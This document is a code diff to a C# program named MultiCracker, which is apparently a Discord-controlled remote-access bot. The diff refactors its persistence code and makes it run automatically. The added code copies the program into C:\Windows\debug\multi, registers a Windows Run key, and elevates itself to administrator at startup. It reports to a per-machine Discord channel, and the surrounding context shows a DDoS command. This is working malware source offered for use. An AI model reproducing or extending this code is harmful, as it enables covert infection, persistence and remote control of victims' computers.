@@ -50,6 +50,8 @@ namespace MultiCracker
         // ----------------------------------------
 
         bool EmergencySTOP = false;
+        bool Persistent = true;
+        bool UAConStart = true;
         private bool DebugMode = false;
 
         // Discord
@@ -110,6 +112,17 @@ namespace MultiCracker
             }
             // Kill all other instances of this program
             KillOtherInstances();
+            // Add persistence
+            if (UAConStart)
+            {
+                // Check if admin
+                bool isAdmin = IsAdministrator();
+                if (!isAdmin)
+                {
+                    // Elevate to admin
+                    ElevateToAdmin();
+                }
+            }
         }
 
         // Kill all other instances of this program
@@ -684,312 +697,12 @@ namespace MultiCracker
                 else if (trimmedContent == "!install")
                 {
                     // Using registry to install persistence
-
-                    // Variables
-                    string keyName = "MultiCracker";
-                    bool fullPersistenceInstalled = false;
-                    bool exePersistenceInstalled = false;
-                    bool regeditPersistenceInstalled = false;
-                    string dropPoint = "C:\\Windows\\debug\\multi";
-                    string exePath = Application.ExecutablePath;
-                    string exeName = Path.GetFileName(exePath);
-                    string fullExePath = Path.Combine(dropPoint, exeName);
-
-
-                    // Check if regedit persistence is already installed
-                    RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                    string[] subKeys = keyCheck.GetValueNames();
-                    foreach (string subKey in subKeys)
-                    {
-                        if (subKey == keyName)
-                        {
-                            regeditPersistenceInstalled = true;
-                        }
-                    }
-
-                    // Check if the executable is in droppoint
-                    if (File.Exists(fullExePath))
-                    {
-                        exePersistenceInstalled = true;
-                    }
-
-                    // Check if both are installed
-                    if (regeditPersistenceInstalled && exePersistenceInstalled)
-                    {
-                        fullPersistenceInstalled = true;
-                    }
-
-                    if (fullPersistenceInstalled)
-                    {
-                        // Send discord message
-                        await message.Channel.SendMessageAsync($"Persistence is already installed.");
-                        // Log
-                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is already installed."));
-                        return;
-                    }
-                    else
-                    {
-                        // Log whats missing for full persistence
-                        if (!regeditPersistenceInstalled)
-                        {
-                            await message.Channel.SendMessageAsync($"Regedit persistence is not installed. Fixing...");
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is not installed. Fixing..."));
-                        }
-                        if (!exePersistenceInstalled)
-                        {
-                            await message.Channel.SendMessageAsync($"Exe persistence is not installed. Fixing...");
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is not installed. Fixing..."));
-                        }
-
-                        // Check if admin
-                        bool isAdmin = IsAdministrator();
-                        if (!isAdmin)
-                        {
-                            // Send discord message
-                            await message.Channel.SendMessageAsync($"Error installing persistence. Not admin. (Use **!elevate** to ask for elevation)");
-                            // Log
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Not admin."));
-                            return;
-                        }
-                        else
-                        {
-                            // Log
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installing persistence..."));
-
-                            // Set important variables
-                            exePath = Application.ExecutablePath;
-                            exeName = Path.GetFileName(exePath);
-                            keyName = "MultiCracker";
-                            dropPoint = "C:\\Windows\\debug\\multi";
-
-                            // Check if dropPoint directory exists
-                            if (!Directory.Exists(dropPoint))
-                            {
-                                // Create directory
-                                Directory.CreateDirectory(dropPoint);
-                                // Log
-                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Created directory: {dropPoint}"));
-                            }
-                            else
-                            {
-                                // Log
-                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Directory already exists: {dropPoint}"));
-                            }
-
-                            try
-                            {
-                                // Move everything in current directory to drop point
-                                string[] files = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory);
-                                foreach (string file in files)
-                                {
-                                    string fileName = Path.GetFileName(file);
-                                    string fullFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
-                                    string newFilePath = Path.Combine(dropPoint, fileName);
-                                    File.Move(fullFilePath, newFilePath);
-                                    // Log
-                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Moved {fileName} to {dropPoint}"));
-                                }
-                            }
-                            catch (Exception ex)
-                            {
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Error moving files to drop point: {ex.Message}");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error moving files to drop point: {ex.Message}"));
-                            }
-
-                            // Create registry key
-                            try
-                            {
-                                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                                string newExePath = Path.Combine(dropPoint, exeName);
-                                key.SetValue(keyName, newExePath);
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Installed persistence.");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installed persistence."));
-                            }
-                            catch (Exception ex)
-                            {
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Error adding registry key: {ex.Message}");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding registry key: {ex.Message}"));
-                            }
-                        }
-                    }
-
-
+                    InstallPersistence();
                 }
                 else if (trimmedContent == "!uninstall")
                 {
                     // Using registry to uninstall persistence
-
-                    // Variables
-                    string keyName = "MultiCracker";
-                    bool anyPersistenceInstalled = false;
-                    bool exePersistenceInstalled = false;
-                    bool regeditPersistenceInstalled = false;
-                    string dropPoint = "C:\\Windows\\debug\\multi";
-                    string exePath = Application.ExecutablePath;
-                    string exeName = Path.GetFileName(exePath);
-                    string fullExePath = Path.Combine(dropPoint, exeName);
-
-
-                    // Check if regedit persistence is already installed
-                    RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                    string[] subKeys = keyCheck.GetValueNames();
-                    foreach (string subKey in subKeys)
-                    {
-                        if (subKey == keyName)
-                        {
-                            regeditPersistenceInstalled = true;
-                        }
-                    }
-
-                    // Check if the executable is in droppoint
-                    if (File.Exists(fullExePath))
-                    {
-                        exePersistenceInstalled = true;
-                    }
-
-                    // Check if both are installed
-                    if (regeditPersistenceInstalled || exePersistenceInstalled)
-                    {
-                        anyPersistenceInstalled = true;
-                    }
-
-                    if (anyPersistenceInstalled)
-                    {
-                        // Log whats missing for full persistence
-                        if (regeditPersistenceInstalled)
-                        {
-                            await message.Channel.SendMessageAsync($"Regedit persistence is installed. Removing...");
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is installed. Removing..."));
-                        }
-                        if (exePersistenceInstalled)
-                        {
-                            await message.Channel.SendMessageAsync($"Exe persistence is installed. Removing...");
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is installed. Removing..."));
-                        }
-
-                        // Check if admin
-                        bool isAdmin = IsAdministrator();
-
-                        // if not admin
-                        if (!isAdmin)
-                        {
-                            // Send discord message
-                            await message.Channel.SendMessageAsync($"Error uninstalling persistence. Not admin. (Use **!elevate** to ask for elevation)");
-                            // Log
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Not admin."));
-                            return;
-                        }
-                        else
-                        {
-                            // Log
-                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Uninstalling persistence..."));
-
-                            // Delete registry key
-                            try
-                            {
-                                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                                key.DeleteValue(keyName);
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Removed registry key!");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Removed registry key!"));
-                                regeditPersistenceInstalled = false;
-                            }
-                            catch (Exception ex)
-                            {
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Error removing registry key: {ex.Message}");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error removing registry key: {ex.Message}"));
-                            }
-
-                            // Delete files in drop point
-                            try
-                            {
-                                string[] files = Directory.GetFiles(dropPoint);
-                                foreach (string file in files)
-                                {
-                                    string fileName = Path.GetFileName(file);
-                                    string fullFilePath = Path.Combine(dropPoint, fileName);
-                                    File.Delete(fullFilePath);
-                                    // Log
-                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {fileName} from {dropPoint}"));
-                                }
-                                exePersistenceInstalled = false;
-                            }
-                            catch (Exception ex)
-                            {
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Error deleting files from drop point: {ex.Message}");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting files from drop point: {ex.Message}"));
-                            }
-
-                            // Delete drop point
-                            try
-                            {
-                                Directory.Delete(dropPoint);
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Deleted drop point!");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted drop point!"));
-                            }
-                            catch (Exception ex)
-                            {
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Error deleting drop point: {ex.Message}");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting drop point: {ex.Message}"));
-                            }
-
-                            // Check if both are installed
-                            if (regeditPersistenceInstalled || exePersistenceInstalled)
-                            {
-                                anyPersistenceInstalled = true;
-                            }
-
-                            if (!anyPersistenceInstalled)
-                            {
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Persistence uninstalled!");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence uninstalled!"));
-                            }
-                            else
-                            {
-                                // Send discord message
-                                await message.Channel.SendMessageAsync($"Error uninstalling persistence. Please try again.");
-                                // Log
-                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Please try again."));
-
-                                // Send discord message and log what is still installed
-                                if (regeditPersistenceInstalled)
-                                {
-                                    await message.Channel.SendMessageAsync($"Regedit persistence is still installed.");
-                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is still installed."));
-                                }
-                                if (exePersistenceInstalled)
-                                {
-                                    await message.Channel.SendMessageAsync($"Exe persistence is still installed.");
-                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is still installed."));
-                                }
-                            }
-                        }
-                    }
-                    else
-                    {
-                        // Send discord message
-                        await message.Channel.SendMessageAsync($"Persistence is not installed.");
-                        // Log
-                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
-                    }
-
+                    UninstallPersistence();
                 }
                 // DDoS
                 else if (trimmedContent.StartsWith("!ddos"))
@@ -1117,6 +830,11 @@ namespace MultiCracker
                         // Start heartbeat timer in a new thread
                         await TimerThread();
                     }
+                    // Install persistence
+                    if (Persistent)
+                    {
+                        InstallPersistence();
+                    }
                 }
                 else
                 {
@@ -1194,7 +912,344 @@ namespace MultiCracker
             }
         }
 
+        // Persistence
+        async void InstallPersistence()
+        {
+            // Using registry to install persistence
+            // Find the name of computer
+            string computerNameRaw = Environment.MachineName;
+            string computerName = computerNameRaw.ToLower();
 
+            // Find the channel
+            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}"); 
+
+            if ( channel == null )
+            {
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
+                return;
+            }
+
+
+            // Variables
+            string keyName = "MultiCracker";
+            bool fullPersistenceInstalled = false;
+            bool exePersistenceInstalled = false;
+            bool regeditPersistenceInstalled = false;
+            string dropPoint = "C:\\Windows\\debug\\multi";
+            string exePath = Application.ExecutablePath;
+            string exeName = Path.GetFileName(exePath);
+            string fullExePath = Path.Combine(dropPoint, exeName);
+
+
+            // Check if regedit persistence is already installed
+            RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            string[] subKeys = keyCheck.GetValueNames();
+            foreach (string subKey in subKeys)
+            {
+                if (subKey == keyName)
+                {
+                    regeditPersistenceInstalled = true;
+                }
+            }
+
+            // Check if the executable is in droppoint
+            if (File.Exists(fullExePath))
+            {
+                exePersistenceInstalled = true;
+            }
+
+            // Check if both are installed
+            if (regeditPersistenceInstalled && exePersistenceInstalled)
+            {
+                fullPersistenceInstalled = true;
+            }
+
+            if (fullPersistenceInstalled)
+            {
+                // Send discord message
+                await channel.SendMessageAsync($"Persistence is already installed.");
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is already installed."));
+                return;
+            }
+            else
+            {
+                // Log whats missing for full persistence
+                if (!regeditPersistenceInstalled)
+                {
+                    await channel.SendMessageAsync($"Regedit persistence is not installed. Fixing...");
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is not installed. Fixing..."));
+                }
+                if (!exePersistenceInstalled)
+                {
+                    await channel.SendMessageAsync($"Exe persistence is not installed. Fixing...");
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is not installed. Fixing..."));
+                }
+
+                // Check if admin
+                bool isAdmin = IsAdministrator();
+                if (!isAdmin)
+                {
+                    // Send discord message
+                    await channel.SendMessageAsync($"Error installing persistence. Not admin. (Use **!elevate** to ask for elevation)");
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Not admin."));
+                    return;
+                }
+                else
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installing persistence..."));
+
+                    // Set important variables
+                    exePath = Application.ExecutablePath;
+                    exeName = Path.GetFileName(exePath);
+                    keyName = "MultiCracker";
+                    dropPoint = "C:\\Windows\\debug\\multi";
+
+                    // Check if dropPoint directory exists
+                    if (!Directory.Exists(dropPoint))
+                    {
+                        // Create directory
+                        Directory.CreateDirectory(dropPoint);
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Created directory: {dropPoint}"));
+                    }
+                    else
+                    {
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Directory already exists: {dropPoint}"));
+                    }
+
+                    try
+                    {
+                        // Move everything in current directory to drop point
+                        string[] files = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory);
+                        foreach (string file in files)
+                        {
+                            string fileName = Path.GetFileName(file);
+                            string fullFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
+                            string newFilePath = Path.Combine(dropPoint, fileName);
+                            File.Move(fullFilePath, newFilePath);
+                            // Log
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Moved {fileName} to {dropPoint}"));
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        // Send discord message
+                        await channel.SendMessageAsync($"Error moving files to drop point: {ex.Message}");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error moving files to drop point: {ex.Message}"));
+                    }
+
+                    // Create registry key
+                    try
+                    {
+                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        string newExePath = Path.Combine(dropPoint, exeName);
+                        key.SetValue(keyName, newExePath);
+                        // Send discord message
+                        await channel.SendMessageAsync($"Installed persistence.");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installed persistence."));
+                    }
+                    catch (Exception ex)
+                    {
+                        // Send discord message
+                        await channel.SendMessageAsync($"Error adding registry key: {ex.Message}");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding registry key: {ex.Message}"));
+                    }
+                }
+            }
+        }
+        async void UninstallPersistence()
+        {
+            // Using registry to uninstall persistence
+
+            // Find the name of computer
+            string computerNameRaw = Environment.MachineName;
+            string computerName = computerNameRaw.ToLower();
+
+            // Find the channel
+            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
+
+            if (channel == null)
+            {
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
+                return;
+            }
+
+            // Variables
+            string keyName = "MultiCracker";
+            bool anyPersistenceInstalled = false;
+            bool exePersistenceInstalled = false;
+            bool regeditPersistenceInstalled = false;
+            string dropPoint = "C:\\Windows\\debug\\multi";
+            string exePath = Application.ExecutablePath;
+            string exeName = Path.GetFileName(exePath);
+            string fullExePath = Path.Combine(dropPoint, exeName);
+
+
+            // Check if regedit persistence is already installed
+            RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            string[] subKeys = keyCheck.GetValueNames();
+            foreach (string subKey in subKeys)
+            {
+                if (subKey == keyName)
+                {
+                    regeditPersistenceInstalled = true;
+                }
+            }
+
+            // Check if the executable is in droppoint
+            if (File.Exists(fullExePath))
+            {
+                exePersistenceInstalled = true;
+            }
+
+            // Check if both are installed
+            if (regeditPersistenceInstalled || exePersistenceInstalled)
+            {
+                anyPersistenceInstalled = true;
+            }
+
+            if (anyPersistenceInstalled)
+            {
+                // Log whats missing for full persistence
+                if (regeditPersistenceInstalled)
+                {
+                    await channel.SendMessageAsync($"Regedit persistence is installed. Removing...");
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is installed. Removing..."));
+                }
+                if (exePersistenceInstalled)
+                {
+                    await channel.SendMessageAsync($"Exe persistence is installed. Removing...");
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is installed. Removing..."));
+                }
+
+                // Check if admin
+                bool isAdmin = IsAdministrator();
+
+                // if not admin
+                if (!isAdmin)
+                {
+                    // Send discord message
+                    await channel.SendMessageAsync($"Error uninstalling persistence. Not admin. (Use **!elevate** to ask for elevation)");
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Not admin."));
+                    return;
+                }
+                else
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Uninstalling persistence..."));
+
+                    // Delete registry key
+                    try
+                    {
+                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        key.DeleteValue(keyName);
+                        // Send discord message
+                        await channel.SendMessageAsync($"Removed registry key!");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Removed registry key!"));
+                        regeditPersistenceInstalled = false;
+                    }
+                    catch (Exception ex)
+                    {
+                        // Send discord message
+                        await channel.SendMessageAsync($"Error removing registry key: {ex.Message}");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error removing registry key: {ex.Message}"));
+                    }
+
+                    // Delete files in drop point
+                    try
+                    {
+                        string[] files = Directory.GetFiles(dropPoint);
+                        foreach (string file in files)
+                        {
+                            string fileName = Path.GetFileName(file);
+                            string fullFilePath = Path.Combine(dropPoint, fileName);
+                            File.Delete(fullFilePath);
+                            // Log
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {fileName} from {dropPoint}"));
+                        }
+                        exePersistenceInstalled = false;
+                    }
+                    catch (Exception ex)
+                    {
+                        // Send discord message
+                        await channel.SendMessageAsync($"Error deleting files from drop point: {ex.Message}");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting files from drop point: {ex.Message}"));
+                    }
+
+                    // Delete drop point
+                    try
+                    {
+                        Directory.Delete(dropPoint);
+                        // Send discord message
+                        await channel.SendMessageAsync($"Deleted drop point!");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted drop point!"));
+                    }
+                    catch (Exception ex)
+                    {
+                        // Send discord message
+                        await channel.SendMessageAsync($"Error deleting drop point: {ex.Message}");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting drop point: {ex.Message}"));
+                    }
+
+                    // Check if both are installed
+                    if (regeditPersistenceInstalled || exePersistenceInstalled)
+                    {
+                        anyPersistenceInstalled = true;
+                    }
+
+                    if (!anyPersistenceInstalled)
+                    {
+                        // Send discord message
+                        await channel.SendMessageAsync($"Persistence uninstalled!");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence uninstalled!"));
+                    }
+                    else
+                    {
+                        // Send discord message
+                        await channel.SendMessageAsync($"Error uninstalling persistence. Please try again.");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Please try again."));
+
+                        // Send discord message and log what is still installed
+                        if (regeditPersistenceInstalled)
+                        {
+                            await channel.SendMessageAsync($"Regedit persistence is still installed.");
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is still installed."));
+                        }
+                        if (exePersistenceInstalled)
+                        {
+                            await channel.SendMessageAsync($"Exe persistence is still installed.");
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is still installed."));
+                        }
+                    }
+                }
+            }
+            else
+            {
+                // Send discord message
+                await channel.SendMessageAsync($"Persistence is not installed.");
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
+            }
+        }
 
         // Timer
         private async Task TimerThread()
@@ -1424,6 +1479,7 @@ namespace MultiCracker
             string formattedTimeRemaining = "";
             string formattedTimeElapsed = "";
             BigInteger possibleCombinations = 0;
+            
 
             // Calculate possible combinations
             try
